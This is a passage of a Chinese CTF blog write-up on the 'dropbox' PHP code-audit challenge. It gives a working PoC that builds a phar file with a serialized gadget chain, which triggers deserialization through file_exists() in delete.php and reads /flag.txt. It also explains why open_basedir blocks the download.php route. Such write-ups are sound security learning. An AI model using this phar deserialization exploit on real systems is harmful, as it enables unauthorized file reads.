+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>离怀秋师傅的poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $db;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> FileList;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files;</span><br><span class="line"><span class="keyword">private</span> $results;</span><br><span class="line"><span class="keyword">private</span> $funcs;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$file=<span class="keyword">new</span> File;</span><br><span class="line">	$file-&gt;filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line"><span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用链："><a href="#利用链：" class="headerlink" title="利用链："></a>利用链：</h3><p>​        上传phar，然后删除时，delete.php处存在file类的open函数，open函数存在file_exists()方法，这样就可以触发我们phar的反序列化，然后我们phar中调用了User类，User类destruct的时候，调用了db.close方法，而这里的db是Filelist类的对象，所以调用了Filelist类的close()方法，但是Filelist又不存在这个方法，所以调用了call方法，使得元素file，也就是/flag.txt调用close方法，也就是包含这个文件。最后，Filelist类调用destruct方法，打印出函数执行结果，也就是根目录下flag.txt文件的内容。</p>
+<p><img src="/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604935565.png" alt="1565604935565"></p>
+<h3 id="疑惑点："><a href="#疑惑点：" class="headerlink" title="疑惑点："></a>疑惑点：</h3><p>为啥download.php不能利用，我觉得那个检查flag文件名的waf应该挡不出才对。</p>
+<p><img src="/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604942764.png" alt="1565604942764"></p>
+<h3 id="解惑："><a href="#解惑：" class="headerlink" title="解惑："></a>解惑：</h3><p>赵师傅指出了一个我之前忽略掉的东西，open_basedir</p>
+<p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”);</p>
+<p>（用open_basedir指定的限制实际上是前缀,而不是目录名。）</p>
+<p>所以download.php只能访问限定的文件夹（因为没有/结尾，所以可以访问限定文件夹的子文件夹）</p>
+<p>而flag是在根目录下，所以无法访问。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/note/" rel="tag"># note</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/09/admin_ssrfme_piapia_ikun/" rel="next" title="admin_ssrfme_piapia_ikun">
+                <i class="fa fa-chevron-left"></i> admin_ssrfme_piapia_ikun
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/21/BUUOJ_SSRF/" rel="prev" title="BUUOJ_SSRF">
+                BUUOJ_SSRF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
+            
+              <p class="site-author-name" itemprop="name">V</p>
+              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://eqqie.cn/" title="eqqie's blog" target="_blank">eqqie's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ragdoll.work/" title="nan-meng" target="_blank">nan-meng</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dropbox代码审计"><span class="nav-number">1.</span> <span class="nav-text">dropbox代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#register-php"><span class="nav-number">1.1.</span> <span class="nav-text">register.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login-php"><span class="nav-number">1.2.</span> <span class="nav-text">login.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#index-php"><span class="nav-number">1.3.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#class-php"><span class="nav-number">1.4.</span> <span class="nav-text">class.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#delete-php"><span class="nav-number">1.5.</span> <span class="nav-text">delete.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload-php"><span class="nav-number">1.6.</span> <span class="nav-text">upload.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#download-php"><span class="nav-number">1.7.</span> <span class="nav-text">download.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">1.8.</span> <span class="nav-text">poc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用链："><span class="nav-number">1.8.1.</span> <span class="nav-text">利用链：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#疑惑点："><span class="nav-number">1.8.2.</span> <span class="nav-text">疑惑点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解惑："><span class="nav-number">1.8.3.</span> <span class="nav-text">解惑：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
